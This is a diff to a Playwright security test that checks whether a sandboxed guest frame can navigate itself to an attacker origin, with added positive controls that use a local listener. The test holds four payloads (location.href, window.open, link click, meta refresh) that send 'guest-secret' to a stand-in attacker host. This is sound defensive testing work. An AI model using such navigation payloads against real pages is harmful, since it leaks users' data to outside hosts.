@@ -1,5 +1,6 @@
 import type { BrowserContext } from '@playwright/test';
 import { test, expect } from '../../../test/e2e/fixture';
+import { useRecorder } from '../../../test/e2e/recorder';
 
 /**
  * Research 14: the guest frame navigating itself (backlog S10 / S11, issue #6 N1 + N2).
@@ -10,6 +11,12 @@ import { test, expect } from '../../../test/e2e/fixture';
  */
 
 const ATTACKER = 'http://attacker.test';
+
+// Evidence for 14.1 (backlog T5): the refused navigation is reported to the wrapper, which runs no script,
+// so no violation reaches the host. The evidence is a listener outside the browser that every vector
+// targets, and the frames on the page (none may hold the target). Positive control per vector: the same
+// markup in a sandboxed frame on the host page, without the wrapper, reaches the listener.
+const recorder = useRecorder();
 
 // Records every request that reaches the attacker origin, and serves a page that grabs any port it is sent.
 async function watchAttacker(context: BrowserContext): Promise<string[]> {
@@ -31,22 +38,32 @@ async function watchAttacker(context: BrowserContext): Promise<string[]> {
     return reached;
 }
 
-const VECTORS: Record<string, string> = {
-    'script (location.href)': `<script>setTimeout(() => { location.href = '${ATTACKER}/?d=guest-secret'; }, 50)</script>`,
-    'script (window.open _self)': `<script>setTimeout(() => { window.open('${ATTACKER}/?d=guest-secret', '_self'); }, 50)</script>`,
-    'link click': `<a id="a" href="${ATTACKER}/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
-    'meta refresh': `<meta http-equiv="refresh" content="0;url=${ATTACKER}/?d=guest-secret">`,
-};
+const vectors = (target: string): Record<string, string> => ({
+    'script (location.href)': `<script>setTimeout(() => { location.href = '${target}/?d=guest-secret'; }, 50)</script>`,
+    'script (window.open _self)': `<script>setTimeout(() => { window.open('${target}/?d=guest-secret', '_self'); }, 50)</script>`,
+    'link click': `<a id="a" href="${target}/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
+    'meta refresh': `<meta http-equiv="refresh" content="0;url=${target}/?d=guest-secret">`,
+});
 
-for (const [name, markup] of Object.entries(VECTORS)) {
-    test(`14.1 self-navigation via ${name} does not reach the network`, async ({ sandbox, context, page }) => {
-        const reached = await watchAttacker(context);
+for (const name of Object.keys(vectors(''))) {
+    test(`14.1 self-navigation via ${name} does not reach the network`, async ({ sandbox, page }) => {
         await sandbox.mount();
 
-        await sandbox.load(markup);
-        await page.waitForTimeout(1500);
+        await sandbox.load(vectors(recorder.blocked)[name]!);
+        await page.waitForTimeout(2000); // the positive control below arrives well within this
 
-        expect(reached, 'the guest navigated itself to the attacker').toEqual([]);
+        expect(recorder.paths('blocked'), 'the guest navigated itself to the listener').toEqual([]);
+        expect(page.frames().map(f => f.url()).filter(url => url.startsWith(recorder.blocked))).toEqual([]);
+    });
+
+    test(`14.1 positive control: ${name} from a sandboxed frame without the wrapper reaches the listener`, async ({ sandbox }) => {
+        await sandbox.page.evaluate((markup) => {
+            const frame = document.createElement('iframe');
+            frame.setAttribute('sandbox', 'allow-scripts');
+            frame.srcdoc = markup;
+            document.body.appendChild(frame);
+        }, vectors(recorder.blocked)[name]!);
+        await recorder.waitFor('blocked', '/?d=guest-secret', 2000);
     });
 }
 
